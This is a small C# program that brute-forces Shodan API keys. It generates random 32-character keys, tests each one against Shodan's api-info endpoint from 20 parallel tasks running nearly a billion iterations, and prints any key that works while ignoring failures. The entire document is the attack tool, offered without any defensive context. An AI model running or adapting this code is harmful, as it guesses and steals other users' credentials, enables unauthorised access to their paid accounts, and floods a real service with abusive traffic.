
using System.Text;

string generanor()
{
    string key = "1Q2W3E4R5T6Y7U8I9O0PAZSXDCFVGBHNJMKLqwertyuioplkjhgfdsazxcvbnm";
    Random rnd = new Random();
    string res="";
    for (int i = 0; i < 32; i++) 
    {
        res += key[rnd.Next(0,key.Length)];
    }
    return res;
}
async Task GetAsync(HttpClient httpClient, string key)
{
    try
    { 
        string req = $"https://api.shodan.io/api-info?key={key}";
        using HttpResponseMessage response = await httpClient.GetAsync(req);
        response.EnsureSuccessStatusCode();
        var s = await response.Content.ReadAsStringAsync();
        await Console.Out.WriteLineAsync(s);
        await Console.Out.WriteLineAsync($"        {key}        ");
    }
    catch (Exception )
    {  } 
}
async Task Rune()
{
    await Console.Out.WriteLineAsync(" Сколько потоков?");
    List<Task> tasks = new List<Task>();
    for (int k = 0; k < 20; /*Кол-во потоков*/ k++)
    {
        tasks.Add(Task.Run(async () =>
        {
            HttpClient client = new HttpClient();
            for (int i = 0; i < 999999999; i++)
            {
                string key = generanor();
                await GetAsync(client, key);
            }
        }));
    }
    await Task.WhenAll(tasks);
}
await Rune();